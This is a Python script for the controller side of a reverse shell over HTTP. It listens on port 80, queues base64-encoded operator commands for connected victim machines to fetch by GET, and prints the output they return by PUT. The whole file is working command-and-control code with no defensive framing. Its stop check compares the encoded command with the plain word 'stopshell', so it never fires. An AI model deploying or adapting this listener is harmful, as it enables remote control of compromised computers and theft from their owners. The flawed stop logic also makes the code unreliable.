from http.server import HTTPServer, SimpleHTTPRequestHandler
from queue import Queue
from sys import argv
from threading import Thread
from time import sleep
import base64

# Command and response queues
command_queue = Queue()
response_queue = Queue()

# List of connected clients
connected_clients = []

# The stop command
STOP_COMMAND = "stopshell"


class ReverseHTTPServerHandler(SimpleHTTPRequestHandler):
    """
        HTTP Server Handler for the reverse shell server
    """

    def do_GET(self):
        """
        GETs will be used to give commands to the client. If there are
        any commands in the command queue then they will be output here.
        If there are no commands then a blank response is given. All requests
        are given a 200 OK response code.
        :return:
        """
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        if self.client_address[0] not in connected_clients:
            connected_clients.append(self.client_address[0])
        if not command_queue.empty():
            self.wfile.write(bytes(command_queue.get(), "UTF-8"))

    def do_PUT(self):
        """
        PUTs will be used to receive responses from the client, just read
        the request data and add it to the response queue. Always returns
        200 OK response.

        :return:
        """
        # Read the response from the put request
        length_header = self.headers.get('content-length')
        length = int(length_header)
        data = self.rfile.read(length)
        response = str(data, "utf8")
        response_queue.put(response)
        # Respond with a 200
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        return

def run_server(host, port):
    """
    Runs the web server listening on the host and port given.

    :param host: The host to listen on
    :param port: The port to listen on
    :return:
    """
    server = HTTPServer((host, port), ReverseHTTPServerHandler)
    # Startup the web server in another thread and interact through the queues
    server_thread = Thread(target=server.serve_forever, args=())
    server_thread.daemon = True
    server_thread.start()

    # Wait for a client to connect
    print("Waiting for client to connect...")
    while len(connected_clients) == 0:
        sleep(1)
    print("Client connected %s" % connected_clients[0])

    # Now enter the read/response loop with the client, reads a command from the server user
    # And then waits on a response from the client
    connected = True
    while connected:
        command = input(">")
        command=command.strip()
        if len(command) > 0:
            # pseudo cd command
            if command.find('cd')==0:
                command="000"+command[2:len(command)].strip()
            elif command.find('chdir')==0:
                command="000"+command[5:len(command)].strip()
            # print(command)
            command =base64.b64encode(command.encode("UTF-8")).decode('UTF-8')
            command_queue.put(command)
            if command == STOP_COMMAND:
                connected = False
        i=0
        while connected and response_queue.empty() and i<100:
            i+=1
            sleep(0.2)
        while connected and not response_queue.empty():
            print(response_queue.get())

    sleep(1)
    # Shutdown and exit
    print("Stopped reverse HTTP server.")
    server.shutdown()
    exit(0)


# # Check that the host and port arguments were given
# if len(argv) < 3 or len(argv) > 3:
#     print("Usage: %s [host] [port]" % argv[0])
#     exit(1)

# Start up the listening server
host_arg = str("0.0.0.0")
port_arg = int(80)
run_server(host_arg, port_arg)
